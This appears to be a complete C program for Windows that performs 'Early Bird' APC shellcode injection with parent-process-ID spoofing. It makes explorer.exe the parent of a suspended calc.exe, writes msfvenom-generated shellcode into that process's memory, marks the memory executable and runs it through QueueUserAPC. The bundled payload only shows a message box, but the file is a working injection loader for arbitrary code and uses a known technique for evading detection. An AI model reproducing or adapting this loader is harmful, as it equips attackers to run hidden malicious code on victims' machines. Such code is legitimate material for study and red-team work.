#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

DWORD getPPID() {

	printf("[*] Attempting to take snapshot for enumeration.\n");
//Taking snapshot for enumeration
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to take a snapshot.\nExiting with error: %ld\n", GetLastError());
		CloseHandle(hSnapshot);
		return EXIT_FAILURE;
	}
	printf("[+] Snapshot taken successsful.\n");
	Sleep(400);
	printf("[*] Enumerating processes...\n");
	Sleep(400);

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	//It loops through the processes until the processname is equals to explorer.exe, Once found, It will store the process ID to a variable names PPID.
	if (Process32First(hSnapshot, &pe32) == TRUE) {
		while (Process32Next(hSnapshot, &pe32) == TRUE) {
			if (wcscmp(pe32.szExeFile, L"explorer.exe") == 0) {
				DWORD PPID = pe32.th32ProcessID;
				return PPID;
				break;
			}
		}
		CloseHandle(hSnapshot);
	}
}

int main() {

	unsigned char shellcode[] =
	//Shellcode for Messagebox generated using msfvenom
		"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

	DWORD oldprotect = 0;
	DWORD PPID = getPPID();
	printf("[*] PPID: Process ID of explorer.exe is identified as %ld\n", PPID);

	//Initializing structures.
	STARTUPINFOEX stinfo = { sizeof(stinfo) };
	PROCESS_INFORMATION pinfo;
	SIZE_T lpsize;
	InitializeProcThreadAttributeList(NULL, 1, 0, &lpsize);

	stinfo.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(lpsize);

	//These functions are self-explanotary.
	if (!InitializeProcThreadAttributeList(stinfo.lpAttributeList, 1, 0, &lpsize)) {
		printf("[!] InitializeProcThreadAttribute Failed.\nExiting with error: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	HANDLE hparentproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PPID);
	if (hparentproc == NULL) {
		printf("[!] Failed to get an handle to the parent process.\nExiting with error: %ld", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle to the parent process.\n");

	if (!UpdateProcThreadAttribute(stinfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hparentproc, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}

	BOOL PSCreate = CreateProcess(L"C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, (CREATE_NO_WINDOW | CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT), NULL, L"C:\\Windows\\System32", &stinfo.StartupInfo, &pinfo);
	if (PSCreate == 0) {
		printf("[!] Failed to create sacrificial process.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}

	HANDLE hProcess = pinfo.hProcess;
	HANDLE hThread = pinfo.hThread;

	LPVOID virtualmem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if(virtualmem == NULL) {
		printf("[!] Failed to allocate memory.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Memory allocation successful.\nLocation: \n\t\\----0x%p\n", virtualmem);

	if (!WriteProcessMemory(hProcess, virtualmem, shellcode, sizeof(shellcode), NULL)) {
		printf("[!] Failed to write shellcode into memory.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Written the shellcode into memory.\nLocation: \n\t\\----0x%p\n", shellcode);

	if (!VirtualProtectEx(hProcess, virtualmem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect)) {
		printf("[!] Failed to change the memory protection.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Memory protection changed from PAGE_READWRITE to PAGE_EXECUTE_READ\n");
//QueueUser APC function.
	QueueUserAPC((PAPCFUNC)virtualmem, hThread, NULL);
	printf("[*] Attempting to run shellcode\n");
	Sleep(1000);
//Resuming the thread will execute the shellcode.
	ResumeThread(hThread);
	
	Sleep(1000);
	printf("[*] Cleaning up..\n");
	CloseHandle(hProcess);
	CloseHandle(hThread);

	printf("[+] Successfully implemented EarlyBirdQueueUserAPC Injection with PPID spoofing.\n");
	return EXIT_SUCCESS;
	
}
